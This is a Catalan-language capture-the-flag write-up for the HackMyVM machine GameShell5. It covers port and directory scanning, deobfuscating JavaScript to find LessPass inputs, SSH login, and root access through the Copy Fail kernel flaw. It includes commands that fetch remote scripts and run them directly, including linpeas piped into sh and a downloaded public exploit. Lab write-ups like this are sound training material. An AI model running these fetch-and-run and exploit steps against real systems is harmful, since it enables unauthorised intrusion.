---
author: Lenam
pubDatetime: 2026-05-13T15:00:00Z
title: WriteUp GameShell5 - HackMyVM
urlSlug: gameshell5-writeup-hackmyvm
featured: false
draft: false
ogImage: "../../../assets/images/gameshell5/OpenGraph.png"
tags:
    - writeup
    - hackmyvm
    - javascript-desofuscacion
    - lesspass
    - copy-fail
description:
    "Writeup de la màquina GameShell5 de HackMyVM: enumeració web, desofuscació de JavaScript, generació de credencials amb LessPass i escalada de privilegis mitjançant Copy Fail."
lang: ca
translationId: gameshell5-writeup-hackmyvm
---

![HackMyVM](../../../assets/images/gameshell5/OpenGraph.png)

Writeup de la màquina **GameShell5** de [HackMyVM](https://hackmyvm.eu/): En aquesta màquina, creada per **Sublarge**, desofuscarem codi JavaScript, explorarem el gestor de contrasenyes LessPass i aprofitarem l'última gran vulnerabilitat de Linux coneguda com a Copy Fail.


![HackMyVM](../../../assets/images/gameshell5/gameshell5.png)


## Taula de continguts


---

## Enumeració

El primer pas consisteix a identificar quins serveis exposa la màquina i amb quines versions, per decidir per on continuar l'atac.

![Pantalla Virtual Box Machine](../../../assets/images/gameshell5/screenshot-vbox.png)

El primer `nmap` recorre **tots els ports TCP** (`-p-`), assumeix el host com a actiu sense ping ICMP (`-Pn`, útil quan el firewall bloqueja el ping però els ports responen) i evita la resolució DNS inversa (`-n`) perquè l'escaneig sigui més ràpid i predictible. El resultat mostra dos ports oberts: **22** (SSH) i **80** (HTTP).

```bash
$ nmap -p- -Pn -n 10.0.2.13
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-13 14:28 CEST
Nmap scan report for 10.0.2.13
Host is up (0.000063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E8:44:57 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.24 seconds

```

El segon `nmap` s'executa únicament sobre aquests ports i afegeix la detecció de serveis i l'execució de scripts per defecte (`-sV` per identificar la versió del banner; `-sC` per executar scripts considerats segurs). D'aquesta manera, s'obtenen les versions d'OpenSSH i Apache.

```bash
$ nmap -p22,80 -sVC -Pn -n 10.0.2.13            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-13 14:30 CEST
Nmap scan report for 10.0.2.13
Host is up (0.00049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Retro Bowl
| http-robots.txt: 4 disallowed entries 
|_/*.js$ /*.js? /*.css$ /*.css?
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:E8:44:57 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds

```

```bash
$ curl http://10.0.2.13   
        <title>Retro Bowl</title>
<iframe src="https://shellshock.io/?utm=chromeext" frameborder="0" scrolling="yes" width="100%" height="100%" loading="lazy"></iframe>

<style type="text/css">iframe { position: absolute; width: 100%; height: 100%; z-index: 999; }</style>
```

L'HTML que se serveix al port 80 conté un iframe que incrusta un joc en línia extern.

> ⚠️ **Avís important:** Aquest lloc web que es carrega a l'iframe és un servei tercer, aliè a l'entorn del CTF. Sota cap concepte hem d'intentar atacar, escanejar ni interactuar amb aquest domini extern: fer-ho pot ser il·legal i, a més, NO és la finalitat del repte. El nostre únic objectiu ha de ser la IP interna del laboratori, mai recursos d'internet aliens a l'exercici.

Amb aquest escaneig ràpid amb Gobuster descobrim els fitxers i rutes principals accessibles a la web objectiu, incloent-hi fitxers com index.html, style.css, script.js, robots.txt i l'endpoint prohibit server-status.

```bash
$ gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.0.2.13/ -x html,php,js,txt,zip,tar,css
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.13/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,js,txt,zip,tar,css,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 273]
style.css            (Status: 200) [Size: 50645]
script.js            (Status: 200) [Size: 13483]
robots.txt           (Status: 200) [Size: 84]
server-status        (Status: 403) [Size: 274]
Progress: 1764456 / 1764456 (100.00%)
===============================================================
Finished
===============================================================
```

El fitxer `robots.txt` recuperat mitjançant `curl` des de l'arrel del lloc conté restriccions típiques per als rastrejadors (user-agent `*`). S'especifica el bloqueig a URLs que acaben en `.js` o `.css` (tant terminacions exactes com paràmetres amb signe d'interrogació), cosa que sol buscar evitar que els cercadors indexin fitxers JavaScript i CSS.

```bash
$ curl http://10.0.2.13/robots.txt
User-agent: *
Disallow: /*.js$
Disallow: /*.js?
Disallow: /*.css$
Disallow: /*.css?
```

Aquest tipus de configuració és habitual per protegir certs recursos estàtics de la indexació, però no representa necessàriament una barrera de seguretat; simplement suggereix als bots que no indexin aquests tipus de fitxers.

## Intrusió

En revisar els resultats veiem que els fitxers `style.css` i `script.js` identificats amb gobuster no estan sent referenciats a la pàgina `index.html`. Això resulta cridaner i motiva a analitzar-los amb més detall.

El fitxer `script.js` es troba ofuscat:

```bash
$ curl http://10.0.2.13/script.js 
(function(_0x58bb25,_0x331bd0){function _0x5bddb3(_0x1ec754,_0x2f330a,_0x586ba6,_0x118108){return _0xadc0(_0x586ba6-0xa3,_0x2f330a);}const _0x59ed98=_0x58bb25();function _0x1e1950(_0x3bf959,_0x2be6e1,_0x188497,_0x447fd8){ ...  const loginName='noob',masterPass=_0x43faef(0x2d,0x3e,0x43,0x4b)+'kLmNoP';
```

D'altra banda, el fitxer `style.css` conté una imatge codificada en base64 de manera incrustada:

```bash
$ curl http://10.0.2.13/style.css
body {
  margin: 0;
  padding: 0;
  background: #f5f5f5;
  background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAB+8AAAHLCAYAAAAJAdquAAAACXBIWXMAAC4jAAAuIwF4pT92AAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAIABJREFUeJzs3XeYXVXVx/HvpEwqKYSO0gSkd6TZQEQQkA5iA4GgWLCgL9gQFRVRsaKAioqIUhUQUCwoCnZRECmCAlIERFoIpM77x7pjJskkmXLvWad8P89znxlIcvfK5Mzcfc9v77W7enp6kNRRI4B1gI2B1YCVW49VgZVaHye3fu/k1u8HeLT18SngEeDh1uPfwD/6PO4E5nT6LyFJkiRJkiRJkiSpc7oM76W2GgdsBmwObNH6uBkwsYNjzgZuBm4E/gxcD/wJmNvBMSVJkiRJkiRJkiS1keG9NDwjge2BXYGdW5+PSa0oPAX8BrgGuJII9f1mlyRJkiRJkiRJkkrK8F4avDHAHsA+wF7ACrnlDMj9RIh/EfATYF5uOZIkSZIkSZIkSZL6MryXBqYLeBHwGuAAYEpuOcPyIHAhcC7w2+RaJEmSJEmSJEmSJGF4Ly3LZOAQ4Fhg4+RaOuEW4Ezga8CM5FokSZIkSZIkSZKkxjK8l/q3LnAccBgwLrmWIjwBfAU4jWixL0mSJEmSJEmSJKlAhvfSwjYFTgT2B0Yk15JhFnAOcCpwR3ItkiRJkiRJkiRJUmMY3kthLeA9wJHAyNxSSmEO8HXgJOCB3FIkSZIkSZIkSZKk+jO8V9NNJQLqY4DRuaWU0lNEK ... 3/GwAAAAAAAMC6/B91mVarORIqCQAAAABJRU5ErkJggg==');
  font-family: "Arial", sans-serif;
}

.container {
  width: 1200px;
  margin: 0 auto;
  padding: 20px;
}

.btn {
  padding: 8px 16px;
  border: none;
  border-radius: 4px;
  background: #4299e1;
  color: white;
  cursor: pointer;
}
```

### Imatge LessPass en CSS

El següent comandament permet extreure i desar localment la imatge incrustada en base64 que es troba a la propietat `background-image` del fitxer CSS:

```bash
curl -s http://10.0.2.13/style.css | sed -n "s/.*background-image: *url(['\"]data:image\/png;base64,\([^'\"]*\)['\"].*/\1/p" | base64 -d > image.png
```

Després d'extreure la imatge incrustada al CSS, veiem que correspon al logotip de **LessPass**, un gestor de contrasenyes que no emmagatzema mai les contrasenyes, sinó que les genera dinàmicament a partir de la contrasenya mestra, l'usuari i el nom del servei. Si es perd alguna d'aquestes dades, no és possible recuperar la contrasenya generada.

![LessPass](../../../assets/images/gameshell5/less-pass.png)

Més detalls:  
[How does LessPass work?](https://blog.lesspass.com/2016-10-19/how-does-it-work)  
Codi font: [GitHub LessPass](https://github.com/lesspass/lesspass/)


### Desofuscació de JavaScript

Si copiem el JavaScript ofuscat que hem obtingut a `script.js` i l'analitzem amb l'eina en línia de desofuscació `https://deobfuscate.relative.im/`, trobarem unes constants molt interessants al final del script.

```javascript
const site = 'shell-shockers.dsz'
const loginName = 'noob',
  masterPass = 'aBcDeFgHiJkLmNoP'
```

![JavaScript](../../../assets/images/gameshell5/javascript.png)

### Credencials SSH noob

Només ens queda combinar-ho tot: utilitzar LessPass juntament amb les constants trobades al codi ofuscat.

Podem instal·lar LessPass o accedir directament al lloc web https://lesspass.com/, on, deixant les opcions, longitud i comptador per defecte, obtindrem la contrasenya de l'usuari noob.

![JavaScript](../../../assets/images/gameshell5/less-pass-noob.png)

Accedim al servidor mitjançant SSH utilitzant les credencials generades amb LessPass, cosa que ens permet llegir la flag ubicada al fitxer user.txt.

```
$ ssh noob@10.0.2.13
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
noob@10.0.2.13's password: 
Linux GameShell5 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 12 12:06:48 2026 from 10.0.2.12
noob@GameShell5:~$ cat user.txt
flag{XXXXXXXXXXXXXXXXXXXXXXXXX}

```

## Escalada de privilegis

### Linpease

Si descarreguem LinPeas i l'executem, no funcionarà correctament perquè no troba el binari `grep`.

```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

...
sh: 459: grep: not found
sh: 461: grep: not found
sh: 477: grep: not found
sh: 477: grep: not found
sh: 478: grep: not found
sh: 478: grep: not found
...

```

Tanmateix, el sistema operatiu té instal·lat `busybox`, que inclou `grep` incorporat. Per tant, podem crear un enllaç simbòlic anomenat `grep` que apunti a `busybox` i afegir la ruta al `PATH` perquè LinPeas l'utilitzi correctament. Així, aconseguirem executar LinPeas sense problemes.

El comandament per fer-ho seria:

```
ln -s /bin/busybox grep && export PATH=$PWD:$PATH
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Trobem que el sistema és vulnerable a Copy Fail amb linpease.

![Linpease](../../../assets/images/gameshell5/copy-fail-linpease.png)

### Copy Fail exploit

> Nota: No estic completament segur de si aquesta era la via intencionada per a l'escalada de privilegis a la màquina, ja que la vulnerabilitat de Copy Fail és relativament moderna i afecta molts sistemes recents. A més, vaig observar que hi ha diversos usuaris creats al sistema, cosa que em fa pensar que podria existir una altra ruta d'escalada, possiblement mitjançant algun tipus de moviment lateral que, en el meu cas, no vaig arribar a trobar. Si descobreixes una altra forma o la ruta "oficial", m'encantaria conèixer-la!

Observem que el sistema té instal·lada una versió de Python 3.9.0.

```bash
noob@GameShell5:~$ python3 --version
Python 3.9.2
```

Busquem un exploit de copy fail que funcioni amb la versió de python del sistema i trobem el següent.

[https://github.com/w3llr00t3d/CVE-2026-31431-PoC](https://github.com/w3llr00t3d/CVE-2026-31431-PoC)

El descarreguem i l'executem i obtenim credencials de root.

```bash
wget https://github.com/w3llr00t3d/CVE-2026-31431-PoC/raw/refs/heads/main/poc.py
python3 ./poc.py
```

Obtenim credencials de root i podem llegir la flag de root.txt.


![Root flag](../../../assets/images/gameshell5/root-flag.png)


> Gràcies per llegir aquest writeup! Espero que t'hagi servit, que hagis après alguna cosa nova o almenys que t'hagis divertit seguint el procés. Ens veiem al pròxim repte!

---

## Referències

Material de consulta alineat amb el que apareix al writeup (enumeració web, **LessPass**, desofuscació de JavaScript, **LinPEAS** en entorns mínims i escalada **Copy Fail**):

- [HackMyVM](https://hackmyvm.eu/) — plataforma de la màquina **GameShell5**
- [Nmap](https://nmap.org/book/man.html) — escaneig de ports i detecció de serveis (`-p-`, `-sV`, `-sC`)
- [Gobuster](https://github.com/OJ/gobuster) — fuzzing de directoris i extensions en HTTP
- [SecLists — wordlists web](https://github.com/danielmiessler/SecLists) — llistes com la utilitzada amb Gobuster
- [LessPass — How does it work?](https://blog.lesspass.com/2016-10-19/how-does-it-work) — generació determinista de contrasenyes (lloc, usuari, contrasenya mestra)
- [LessPass — codi font](https://github.com/lesspass/lesspass)
- [lesspass.com](https://lesspass.com/) — generador en línia citat al writeup
- [Deobfuscate (relative.im)](https://deobfuscate.relative.im/) — eina en línia per analitzar el `script.js` ofuscat
- [PEASS-ng / LinPEAS](https://github.com/peass-ng/PEASS-ng) — script d'enumeració per a escalada de privilegis
- [BusyBox](https://busybox.net/) — utilitaris compactes; enllaç simbòlic `grep` → `busybox` quan falta GNU `grep` al `PATH`
- [PoC Copy Fail — CVE-2026-31431](https://github.com/w3llr00t3d/CVE-2026-31431-PoC) — exploit en Python utilitzat després de detectar la vulnerabilitat amb LinPEAS
